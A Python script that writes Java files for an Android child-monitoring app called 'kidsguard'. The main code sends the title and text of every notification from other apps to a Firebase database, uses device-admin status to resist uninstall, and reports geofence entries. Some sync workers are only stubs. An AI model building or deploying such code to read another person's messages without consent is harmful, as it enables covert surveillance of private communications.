import os
b = "app/src/main/java/com/kidsguard/child"

files = {}

files["UninstallAuthActivity.java"] = """package com.kidsguard.child;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.os.Bundle;
import android.util.Log;
public class UninstallAuthActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(cn)) {
            Log.d("UninstallAuth", "Admin active — blocking uninstall");
        }
        finish();
    }
}
"""

files["NotifListener.java"] = """package com.kidsguard.child;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class NotifListener extends NotificationListenerService {
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        io.execute(() -> {
            try {
                CharSequence t = sbn.getNotification().extras.getCharSequence("android.title");
                CharSequence tx = sbn.getNotification().extras.getCharSequence("android.text");
                JSONObject o = new JSONObject();
                o.put("app", sbn.getPackageName());
                o.put("title", t != null ? t.toString() : "");
                o.put("text", tx != null ? tx.toString() : "");
                o.put("time", sbn.getPostTime());
                FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(this) + "/notifs.json", o.toString());
            } catch (Exception e) { Log.e("Notif", "Fail", e); }
        });
    }
    @Override
    public void onDestroy() {
        io.shutdownNow();
        super.onDestroy();
    }
}
"""

files["GeofenceReceiver.java"] = """package com.kidsguard.child;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;
public class GeofenceReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null) return;
        String id = intent.getStringExtra("geofence_id");
        boolean entering = intent.getBooleanExtra(LocationManager.KEY_PROXIMITY_ENTERING, false);
        Log.d("Geofence", (entering ? "Enter" : "Exit") + " id=" + id);
        try {
            JSONObject o = new JSONObject();
            o.put("geofence_id", id != null ? id : "unknown");
            o.put("entering", entering);
            o.put("time", System.currentTimeMillis());
            FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(ctx) + "/geofence.json", o.toString());
        } catch (Exception e) { Log.e("Geofence", "Fail", e); }
    }
}
"""

files["SyncWorker.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.util.Log;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
public class SyncWorker extends Worker {
    public SyncWorker(Context context, WorkerParameters params) {
        super(context, params);
    }
    @Override
    public Result doWork() {
        return doSync() ? Result.success() : Result.retry();
    }
    private boolean doSync() {
        try {
            Log.d("SyncWorker", "Syncing data...");
            return true;
        } catch (Exception e) {
            Log.e("SyncWorker", "Sync failed", e);
            return false;
        }
    }
}
"""

files["CriticalSyncWorker.java"] = """package com.kidsguard.child;
import android.content.Context;
import android.os.BatteryManager;
import android.util.Log;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
public class CriticalSyncWorker extends Worker {
    public CriticalSyncWorker(Context context, WorkerParameters params) {
        super(context, params);
    }
    @Override
    public Result doWork() {
        BatteryManager bm = (BatteryManager) getApplicationContext().getSystemService(Context.BATTERY_SERVICE);
        if (bm != null && !bm.isCharging() && bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) < 10) {
            Log.w("CritSync", "Low battery — retrying");
            return Result.retry();
        }
        try {
            Log.d("CritSync", "Critical sync executing...");
            return Result.success();
        } catch (Exception e) {
            Log.e("CritSync", "Fail", e);
            return Result.retry();
        }
    }
}
"""

for name, code in files.items():
    with open(f"{b}/{name}", "w") as f:
        f.write(code)
    print(f"Fixed {name}")

print("Chunk 3 done — 5 files. All 15 restored.")
